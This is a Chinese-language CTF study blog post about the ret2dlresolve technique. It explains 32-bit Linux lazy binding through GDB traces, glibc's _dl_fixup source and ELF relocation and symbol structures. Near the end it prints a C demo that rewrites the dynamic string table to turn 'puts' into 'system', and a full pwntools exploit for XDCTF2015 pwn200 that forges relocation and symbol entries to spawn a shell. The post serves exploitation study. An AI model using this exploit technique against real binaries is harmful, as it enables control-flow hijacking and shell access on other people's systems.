&emsp;&emsp;<font size=2>ret2dlresolve是真的学了就忘，学了就忘，最近又打算复习一遍了，然后学一下roputils。</font></br>

&emsp;&emsp;<font size=2>首先写一个最简单的`puts`：</font></br>

```C
#include <stdio.h>

int main()
{
	puts("Hello, world!");

	return 0;
}

```

&emsp;&emsp;<font size=2>然后用`gcc`的`-m32`编译成32位的，用gdb打开步入`puts`函数可以看到这些：</font></br>

```
 ► 0x80482e0  <puts@plt>                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] <0x804a00c>
 
   0x80482e6  <puts@plt+6>                push   0
   0x80482eb  <puts@plt+11>               jmp    0x80482d0
    ↓
   0x80482d0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] <0x804a004>
   0x80482d6                              jmp    dword ptr [0x804a008] <0xf7fee000>
    ↓
   0xf7fee000 <_dl_runtime_resolve>       push   eax
   0xf7fee001 <_dl_runtime_resolve+1>     push   ecx
   0xf7fee002 <_dl_runtime_resolve+2>     push   edx
   0xf7fee003 <_dl_runtime_resolve+3>     mov    edx, dword ptr [esp + 0x10]
   0xf7fee007 <_dl_runtime_resolve+7>     mov    eax, dword ptr [esp + 0xc]
   0xf7fee00b <_dl_runtime_resolve+11>    call   _dl_fixup <0xf7fe77e0>
```

&emsp;&emsp;<font size=2>可以看到处于Linux的延迟绑定机制，目前plt里面并不是真的puts函数，而是一个跳转到不知道什么地方去的地址，我们只知道接下去要做的就是先补上`puts`函数的地址，那这一个过程是怎么样的呢？一步一步看，首先记住这两行代码，这是比较重要的（第一个jmp只是跳到了下一条指令，这里暂时忽略）：</font></br>

```
   0x80482e6  <puts@plt+6>                push   0
   0x80482eb  <puts@plt+11>               jmp    0x80482d0
```

&emsp;&emsp;<font size=2>这个`0x80482d0`表示`plt0`，所有函数第一次调用在绑定时都会跳转到这个地址，根据`push 0`的这个0偏移去找真正的函数地址，第二个`push   dword ptr [_GLOBAL_OFFSET_TABLE_+4]`是一个叫做`link_map`的结构体，然后第二个jmp跳转到了`[0x804a008]`，这其实是`_dl_runtime_resolve`的地址，将这些操作串联起来相当于执行了`_dl_runtime_resolve(link_map, offset);`</font></br>

&emsp;&emsp;<font size=2>接下来我们找到`_dl_runtime_resolve`的源码实现处`glibc-2.23/sysdeps/i386/dl-trampoline.S`，没错是汇编写的：</font></br>

```
        .text
        .globl _dl_runtime_resolve
        .type _dl_runtime_resolve, @function
        cfi_startproc
        .align 16
_dl_runtime_resolve:
        cfi_adjust_cfa_offset (8)
        pushl %eax              # Preserve registers otherwise clobbered.
        cfi_adjust_cfa_offset (4)
        pushl %ecx
        cfi_adjust_cfa_offset (4)
        pushl %edx
        cfi_adjust_cfa_offset (4)
        movl 16(%esp), %edx     # Copy args pushed by PLT in register.  Note
        movl 12(%esp), %eax     # that `fixup' takes its parameters in regs.
        call _dl_fixup          # Call resolver.
        popl %edx               # Get register content back.
        cfi_adjust_cfa_offset (-4)
        movl (%esp), %ecx
        movl %eax, (%esp)       # Store the function address.
        movl 4(%esp), %eax
        ret $12                 # Jump to function address.
        cfi_endproc
        .size _dl_runtime_resolve, .-_dl_runtime_resolve
```

&emsp;&emsp;<font size=2>其实际上调用了`_dl_fixup`，并且之前的`link_map`和`offset`通过`edx`和`eax`寄存器传参，然后到了`glibc-2.23/elf/dl-runtime.c`：</font></br>

```C
#ifndef reloc_offset
# define reloc_offset reloc_arg
# define reloc_index  reloc_arg / sizeof (PLTREL)
#endif

DL_FIXUP_VALUE_TYPE
attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
           ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
           struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
  
   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
        { 
          const ElfW(Half) *vernum =
            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
          version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }

      /* We need to keep the scope around so do some locking.  This is
         not necessary for objects which cannot be unloaded or when
         we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
        {
          //...
        }

#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif

      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

```

&emsp;&emsp;<font size=2>其中相关结构体定义比较多，我都放在下面：</font></br>

```C
#define __ELF_NATIVE_CLASS 32

#define ELFW(type)      _ElfW (ELF, __ELF_NATIVE_CLASS, type)
#define ElfW(type)	_ElfW (Elf, __ELF_NATIVE_CLASS, type)
#define _ElfW(e,w,t)	_ElfW_1 (e, w, _##t)
#define _ElfW_1(e,w,t)	e##w##t

#define ELF32_R_TYPE(val)		((val) & 0xff)
#define ELF32_R_SYM(val)		((val) >> 8)

typedef uint32_t Elf32_Addr;

typedef	int32_t  Elf32_Sword;
typedef uint32_t Elf32_Word;
typedef struct
{
  Elf32_Sword   d_tag;                  /* Dynamic entry type */
  union
    {
      Elf32_Word d_val;                 /* Integer value */
      Elf32_Addr d_ptr;                 /* Address value */
    } d_un;
} Elf32_Dyn;


struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;          /* Difference between the address in the ELF
                                   file and the addresses in memory.  */
    char *l_name;               /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;            /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  
    /* All following members are internal to the dynamic linker.
       They may change without notice.  */

    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;

    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;

    struct libname_list *l_libname;
    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */

    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];

  	...
    ...


```

&emsp;&emsp;<font size=2>`link_map`是一个很大的结构体，就不全部放上去了；看`_dl_fixup`的源码，我们可以看到`symtab`，`strtab`，`reloc`，`sym`按照某种方式计算赋值，然后调用`_dl_lookup_symbol_x`时参数是这样的 ，注意这里部分为寄存器传参，参数1、2、3分为对应的是寄存器eax、edx、ecx：</font></br>

```
 EAX  0x8048236 ◂— jo     0x80482ad /* 'puts' */
 ECX  0xffffcec4 —▸ 0x80481dc ◂— sbb    al, byte ptr [eax]
 EDX  0xf7ffd918 ◂— 0x0
 
   0xf7fe788f <_dl_fixup+175>    push   0
   0xf7fe7891 <_dl_fixup+177>    push   esi
   0xf7fe7892 <_dl_fixup+178>    push   1
   0xf7fe7894 <_dl_fixup+180>    push   edx
   0xf7fe7895 <_dl_fixup+181>    mov    edx, edi
   0xf7fe7897 <_dl_fixup+183>    push   dword ptr [edi + 0x1cc]
 ► 0xf7fe789d <_dl_fixup+189>    call   _dl_lookup_symbol_x <0xf7fe2a60>

pwndbg> x/5xw $esp
0xffffce88:	0xf7ffdad0	0xf7fd34a0	0x00000001	0x00000001
0xffffce98:	0x00000000
```

&emsp;&emsp;<font size=2>有点懒得看`_dl_lookup_symbol_x`的源码了，反正根据[veritas501]([https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/](https://veritas501.space/2017/10/07/ret2dl_resolve学习笔记/))提到最好构造`version`为NULL比较稳；那就可以在`DT_VERSYM`里面找一个`*(uint16_t* Addr == 0)`的地址，因为：</font></br>

```C
typedef uint16_t Elf32_Half;

const ElfW(Half) *vernum =
            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
version = &l->l_versions[ndx];
if (version->hash == 0)
	version = NULL;
```

&emsp;&emsp;<font size=2>接下去就直接笼统的回顾一下lazy binding的加载过程吧，用`readelf -S test`先kkp：</font></br>

```
There are 31 section headers, starting at offset 0x17dc:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
...

  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1
  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4
  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4
  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8
  [29] .symtab           SYMTAB          00000000 001054 000450 10     30  47  4
  [30] .strtab           STRTAB          00000000 0014a4 00022c 00      0   0  1
```

&emsp;&emsp;<font size=2>然后直接开始看代码，假如要调用`put("hello, world");`打印一串字符串的话，在plt0之前是这样的：</font></br>

```
 ► 0x80482e0  <puts@plt>                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] <0x804a00c>
 
   0x80482e6  <puts@plt+6>                push   0
   0x80482eb  <puts@plt+11>               jmp    0x80482d0
    ↓
   0x80482d0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] <0x804a004>
   0x80482d6                              jmp    dword ptr [0x804a008] <0xf7fee000>
    ↓
   0xf7fee000 <_dl_runtime_resolve>       push   eax
   0xf7fee001 <_dl_runtime_resolve+1>     push   ecx
   0xf7fee002 <_dl_runtime_resolve+2>     push   edx
   0xf7fee003 <_dl_runtime_resolve+3>     mov    edx, dword ptr [esp + 0x10]
   0xf7fee007 <_dl_runtime_resolve+7>     mov    eax, dword ptr [esp + 0xc]
   0xf7fee00b <_dl_runtime_resolve+11>    call   _dl_fixup <0xf7fe77e0>
```

&emsp;&emsp;<font size=2>如果一个函数是第一次调用的话，plt表并不是实际函数地址，只有第一次调用的时候plt表才会被填充上函数的地址，然后跳转到函数执行；那么第一次调用函数的时候实际上会跳转去填充plt，绑定函数。首先看这两行：</font></br>

```
   0x80482e6  <puts@plt+6>                push   0
   0x80482eb  <puts@plt+11>               jmp    0x80482d0
```

&emsp;&emsp;<font size=2>这个`push 0`中的0代表的是`puts`这个函数的`reloc`表在`.rel.plt`中的偏移，在这里也就是偏移0咯，那么我们就可以得到这个结构体：</font></br>

```
LOAD:08048298 ; ELF JMPREL Relocation Table
LOAD:08048298                 Elf32_Rel <804A00Ch, 107h> ; R_386_JMP_SLOT puts
LOAD:080482A0                 Elf32_Rel <804A010h, 307h> ; R_386_JMP_SLOT __libc_start_main
LOAD:080482A0 LOAD            ends
```

&emsp;&emsp;<font size=2>这个结构体的定义如下：</font></br>

```C
typedef struct {
    Elf32_Addr r_offset;    // 对于可执行文件，此值为虚拟地址
    Elf32_Word r_info;      // 符号表索引
} Elf32_Rel;
#define ELF32_R_SYM(i) ((i)>>8)
#define ELF32_R_TYPE(i) ((unsigned char)(i))
#define ELF32_R_INFO(s, t) (((s)<<8) + (unsigned char)(t))
```

&emsp;&emsp;<font size=2>`r_offset`代表`.got.plt`里的地址，第二个成员`r_info`其实包含了两个变量，其中的低8字节代表类型，这里的这里就是`07h`代表导入函数，其他的我也不关心，高字节里的`1`则代表符号表索引，就是`.dynsym`的索引，其结构体定义如下：</font></br>

```
typedef struct
{
    Elf32_Word    st_name;   /* Symbol name (string tbl index) */
    Elf32_Addr    st_value;  /* Symbol value */
    Elf32_Word    st_size;   /* Symbol size */
    unsigned char st_info;   /* Symbol type and binding */
    unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
    Elf32_Section st_shndx;  /* Section index */
} Elf32_Sym;
```

&emsp;&emsp;<font size=2>在IDA里面可以看到这个地址是这样的：</font></br>

```
LOAD:080481CC ; ELF Symbol Table
LOAD:080481CC                 Elf32_Sym <0>
LOAD:080481DC                 Elf32_Sym <offset aPuts - offset byte_804821C, 0, 0, 12h, 0, 0> ; "puts"
```

&emsp;&emsp;<font size=2>这里我们发现第一个成员`st_name`对应的是`offset aPuts - offset byte_804821C`，没错，这个成员代表的是一个偏移量，是代表了这个函数的名称在`.dynstr`中的偏移，也就是`"puts"`，IDA我们也发现确实如此：</font></br>

```
LOAD:0804821C ; ELF String Table
LOAD:0804821C byte_804821C    db 0                    ; DATA XREF: LOAD:080481DC↑o
LOAD:0804821C                                         ; LOAD:080481EC↑o ...
LOAD:0804821D aLibcSo6        db 'libc.so.6',0
LOAD:08048227 aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804820C↑o
LOAD:08048236 aPuts           db 'puts',0             ; DATA XREF: LOAD:080481DC↑o
LOAD:0804823B aLibcStartMain  db '__libc_start_main',0
LOAD:0804823B                                         ; DATA XREF: LOAD:080481FC↑o
LOAD:0804824D aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:080481EC↑o
LOAD:0804825C aGlibc20        db 'GLIBC_2.0',0
```

&emsp;&emsp;<font size=2>这里就有了一种非常简单的Exploit手法，如果`reloc`可写的话可以直接修改`.dynamic`处的字符串表为其他地址，然后在"puts"的偏移处写入一个"system"，非常简单的完成了一个getshell，例如RCTF2018的RNote4就是这样实现的，用C写一个简单的例子就是这样（RELPLT等地址改为你的实际地址，编译选项用-z norelro取消重定向段保护）：</font></br>

```C
/*
typedef struct {
    Elf32_Sword d_tag;
    union {
        Elf32_Word  d_val;
        Elf32_Addr  d_ptr;
    } d_un;
} Elf32_Dyn;
*/

#include <stdio.h>

#define RELPLT		0x8048278
#define DYNSYM		0x80481ac
#define DYNAMIC		0x8049620
#define BSS		0x8049728

int main()
{
	int* ptr;
	int index;

	
	// ptr pointer to .rel.plt
	ptr = (int*)RELPLT; 

	// ptr pointer to r_info of Elf32_Rel
	ptr++;

	// get index of Elf32_Sym
	index = (*ptr) >> 8;

	// ptr pointer to .dynsym
	ptr = (int*)DYNSYM;

	// pointer to Elf32_Sym
	ptr = (int*)((int)ptr + 4 * sizeof(int*) * index);

	// get st_name of Elf32_Sym
	index = *ptr;

	// pointer  to .dynamic
	ptr = (int*)DYNAMIC;

	// edit string table to .bss
	*(int*)((int)ptr + 0x44) = BSS;

	// ptr pointer to .bss
	ptr = (int*)BSS;

	// ptr pointer to "puts"
	ptr = (int*)((int)ptr + index);

	// edit "puts" to "system"
	*ptr = 0x74737973;
	*(ptr + 1) = 0x6d65;
	

	puts("/bin/sh\0");

	return 0;
}

```

&emsp;&emsp;<font size=2>RNote4的exp就不放出来了，原理是一样的。在经典的栈溢出题型里没法写到`.dynamic`，要完成利用就需要我们伪造很多东西，文章底部有一个链接很好的一步一步讲解如何手工构造ret2dlresolve，我这里就不重复说了，犯懒了，直接贴上手工构造的脚本吧：</font></br>

```python
#!python
from pwn import *

offset = 112

addr_plt_read  = 0x08048390   # objdump -d -j.plt bof | grep "read"
addr_plt_write = 0x080483c0   # objdump -d -j.plt bof | grep "write"

#./rp-lin-x86  --file=bof --rop=3 --unique > gadgets.txt
pppop_ret = 0x0804856c
pop_ebp_ret   =  0x08048453
leave_ret = 0x08048481

stack_size = 0x800
addr_bss   = 0x0804a020   # readelf -S bof | grep ".bss"
base_stage = addr_bss + stack_size

target = "./pwn200"
io   = process(target)

io.recvuntil('Welcome to XDCTF2015~!\n')
# io.gdb_hint([0x80484bd])

buf1  = 'A' * offset
buf1 += p32(addr_plt_read)
buf1 += p32(pppop_ret)
buf1 += p32(0)
buf1 += p32(base_stage)
buf1 += p32(100)
buf1 += p32(pop_ebp_ret)
buf1 += p32(base_stage)
buf1 += p32(leave_ret)
io.sendline(buf1)
#gdb.attach(io)

cmd = "/bin/sh"
addr_plt_start = 0x8048370 # objdump -d -j.plt bof
addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out
index_offset   = (base_stage + 28) - addr_rel_plt
addr_got_write = 0x804a020
addr_dynsym    = 0x080481d8
addr_dynstr    = 0x08048268
addr_fake_sym  = base_stage + 36
align          = 0x10 - ((addr_fake_sym - addr_dynsym) & 0xf)
addr_fake_sym  = addr_fake_sym + align
index_dynsym   = (addr_fake_sym - addr_dynsym) / 0x10
r_info         = (index_dynsym << 8 ) | 0x7
fake_reloc     = p32(addr_got_write) + p32(r_info)
st_name        = (addr_fake_sym + 16) - addr_dynstr
fake_sym       = p32(st_name) + p32(0) + p32(0) + p32(0x12)

buf2 = 'AAAA'
buf2 += p32(addr_plt_start)
buf2 += p32(index_offset)
buf2 += 'AAAA'
buf2 += p32(base_stage+80)
buf2 += 'aaaa'
buf2 += 'aaaa'
buf2 += fake_reloc
buf2 += 'B' * align
buf2 += fake_sym
buf2 += "system\x00"
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.sendline(buf2)

io.interactive()
```

&emsp;&emsp;<font size=2>64位的大致相同，但是64位因为内存地址的关系，伪造的偏移无法落在一个合法的地址上，也就说version肯定会失败，大佬们有提到用已解析的函数，伪造`l->l_addr`和`sym->st_value`通过glibc中的函数加上任意偏移计算到需要的函数，但是这种方法需要知道GLIBC，如果有glibc的话肯定就有更好的办法了，没必要通过这种方式，所以64位的就这样吧。</font></br>

参考文章：

- https://bestwing.me/Return-to-dl-resolve.html
- [https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/](https://veritas501.space/2017/10/07/ret2dl_resolve学习笔记/)

